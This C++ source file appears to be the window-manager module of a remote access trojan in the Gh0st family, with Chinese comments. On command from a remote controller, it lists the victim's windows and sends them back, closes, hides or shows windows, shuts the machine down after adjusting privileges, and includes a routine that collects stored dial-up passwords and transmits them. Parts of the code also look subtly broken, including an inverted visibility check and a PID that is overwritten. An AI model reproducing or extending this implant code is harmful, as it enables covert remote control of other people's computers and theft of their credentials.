// SystemManager.cpp: implementation of the CSystemManager class.
//
//////////////////////////////////////////////////////////////////////

#include "..\pch.h"
#include "CWindowsManager.h"
#include "Dialupass.h"
#include <tlhelp32.h>
#include <psapi.h>
#include <iphlpapi.h>
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"Psapi.lib")

#include "until.h"
#include <tchar.h>
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////


int GetWindowTextSafe(HWND hWnd, LPTSTR lpString, int nMaxCount);

CWindowsManager::CWindowsManager(CClientSocket* pClient, BYTE bHow) : CManager(pClient)
{
	m_caseSystemIs = bHow;
	if (m_caseSystemIs == COMMAND_WINDOWS)     
	{
		SendWindowsList();
	}
}

CWindowsManager::~CWindowsManager()
{

}
void CWindowsManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{

	SwitchInputDesktop();
	switch (lpBuffer[0])//这里是进程管理接收数据的函数了 判断是哪个命令
	{
	case COMMAND_WSLIST:				//发送窗口列表
		SendWindowsList();
		break;
	case COMMAND_DIALUPASS:				//保留20200530
		break;
	case COMMAND_WINDOW_CLOSE:			//关闭窗口
		CloseTheWindow(lpBuffer + 1);
		break;
	case COMMAND_WINDOW_TEST:			//最大化最小化 隐藏窗口函
		ShowTheWindow(lpBuffer + 1);
		break;
	default:
		break;
	}
}


void CWindowsManager::SendWindowsList()
{
	UINT	nRet = -1;
	//获取窗口列表数据
	LPBYTE	lpBuffer = getWindowsList();
	if (lpBuffer == NULL)
		return;

	//发送遍历到的窗口数据
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}


//保留20200530
void CWindowsManager::SendDialupassList()
{
	CDialupass	pass;

	int	nPacketLen = 0;
	int i = 0;
	for (i = 0; i < pass.GetMax(); i++)
	{
		COneInfo* pOneInfo = pass.GetOneInfo(i);
		for (int j = 0; j < STR_MAX; j++)
			nPacketLen += lstrlen(pOneInfo->Get(j)) + 1;
	}

	nPacketLen += 1;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLen);

	DWORD	dwOffset = 1;

	for (i = 0; i < pass.GetMax(); i++)
	{

		COneInfo* pOneInfo = pass.GetOneInfo(i);
		for (int j = 0; j < STR_MAX; j++)
		{
			int	nFieldLength = lstrlen(pOneInfo->Get(j)) + 1;
			memcpy(lpBuffer + dwOffset, pOneInfo->Get(j), nFieldLength);
			dwOffset += nFieldLength;
		}
	}

	lpBuffer[0] = TOKEN_DIALUPASS;
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);

}


//提权
bool CWindowsManager::DebugPrivilege(const char* PName, BOOL bEnable)
{
	BOOL              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;

	LookupPrivilegeValue(NULL, PName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (GetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}

	CloseHandle(hToken);
	return bResult;
}

void CWindowsManager::ShutdownWindows(DWORD dwReason)
{
	DebugPrivilege(SE_SHUTDOWN_NAME, TRUE);
	ExitWindowsEx(dwReason, 0);
	DebugPrivilege(SE_SHUTDOWN_NAME, FALSE);
}

//窗口回调遍历所有窗口
bool CALLBACK CWindowsManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	DWORD	dwLength = 0;
	DWORD	dwOffset = 0;
	DWORD	dwProcessID = 0;
	LPBYTE	lpBuffer = *(LPBYTE*)lParam;

	char	strTitle[1024];
	memset(strTitle, 0, sizeof(strTitle));
	//获取传进来的窗口句柄的标题
	if (IsWindowVisible(hwnd))
		return true;
	//GetWindowText(hwnd, strTitle, sizeof(strTitle));
	GetWindowTextSafe(hwnd, strTitle, sizeof(strTitle));
	//判断窗口是否可见，标题是否为空
	if (lstrlen(strTitle) == 0)
	{
		OutputDebugString("lstrlen");
		return true;
	}

	//如果指针为空的话申请一个堆
	//（该函数时循环的所以第二次进来就不是空的，用动态的LocalReAlloc改变堆大小实现数据都在一个堆上）
	if (lpBuffer == NULL)
		//第一次申请大小为1是因为第一字节为通知控制端标识
		lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1);

	dwLength = sizeof(DWORD) + lstrlen(strTitle) + 1;
	dwOffset = LocalSize(lpBuffer);

	//计算缓冲区大小
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset + dwLength, LMEM_ZEROINIT | LMEM_MOVEABLE);

	//获取窗口的创建者 + 两个memcpy数据结构为 创建者PID + hwnd + 窗口标题 + 0
	GetWindowThreadProcessId(hwnd, (LPDWORD)(lpBuffer + dwOffset));
	memcpy((lpBuffer + dwOffset), &hwnd, sizeof(DWORD));
	memcpy(lpBuffer + dwOffset + sizeof(DWORD), strTitle, lstrlen(strTitle) + 1);

	*(LPBYTE*)lParam = lpBuffer;

	return true;
}


//获取窗口列表数据
LPBYTE CWindowsManager::getWindowsList()
{
	LPBYTE	lpBuffer = NULL;

	//枚举屏幕上的所有的顶层窗口，轮流地将这些窗口的句柄传递给一个应用程序定义的回调函数。
	//EnumWindows会一直进行下去，直到枚举完所有的顶层窗口，或者回调函数返回了FALSE.
	EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&lpBuffer);

	//数据头填充TOKEN_WSLIST主控端识别
	lpBuffer[0] = TOKEN_WSLIST;
	return lpBuffer;
}


//关闭窗口
void CWindowsManager::CloseTheWindow(LPBYTE buf)
{
	DWORD hwnd;
	memcpy(&hwnd, buf, sizeof(DWORD));				//得到窗口句柄 
	::PostMessage((HWND__*)hwnd, WM_CLOSE, 0, 0);	//向窗口发送关闭消息
}

//显示窗口
void CWindowsManager::ShowTheWindow(LPBYTE buf)
{
	DWORD hwnd;
	DWORD dHow;
	memcpy((void*)&hwnd, buf, sizeof(DWORD));				//得到窗口句柄
	memcpy(&dHow, buf + sizeof(DWORD), sizeof(DWORD));		//得到窗口处理参数
	ShowWindow((HWND__*)hwnd, dHow);
}


int GetWindowTextSafe(HWND hWnd, LPTSTR lpString, int nMaxCount)
{
	if (NULL == hWnd || FALSE == IsWindow(hWnd) || NULL == lpString || 0 == nMaxCount)
	{
		return GetWindowText(hWnd, lpString, nMaxCount);
	}
	DWORD dwHwndProcessID = 0;
	DWORD dwHwndThreadID = 0;
	dwHwndThreadID = GetWindowThreadProcessId(hWnd, &dwHwndProcessID);		//获取窗口所属的进程和线程ID

	if (dwHwndProcessID != GetCurrentProcessId())		//窗口进程不是当前调用进程时，返回原本调用
	{
		return GetWindowText(hWnd, lpString, nMaxCount);
	}

	//窗口进程是当前进程时：
	if (dwHwndThreadID == GetCurrentThreadId())			//窗口线程就是当前调用线程，返回原本调用
	{
		return GetWindowText(hWnd, lpString, nMaxCount);
	}

#ifndef _UNICODE
	WCHAR* lpStringUnicode = new WCHAR[nMaxCount];
	InternalGetWindowText(hWnd, lpStringUnicode, nMaxCount);
	int size = WideCharToMultiByte(CP_ACP, 0, lpStringUnicode, -1, NULL, 0, NULL, NULL);
	if (size <= nMaxCount)
	{
		size = WideCharToMultiByte(CP_ACP, 0, lpStringUnicode, -1, lpString, size, NULL, NULL);
		if (NULL != lpStringUnicode)
		{
			delete[]lpStringUnicode;
			lpStringUnicode = NULL;
		}
		return size;
	}
	if (NULL != lpStringUnicode)
	{
		delete[]lpStringUnicode;
		lpStringUnicode = NULL;
	}
	return 0;

#else
	return InternalGetWindowText(hWnd, lpString, nMaxCount);
#endif
}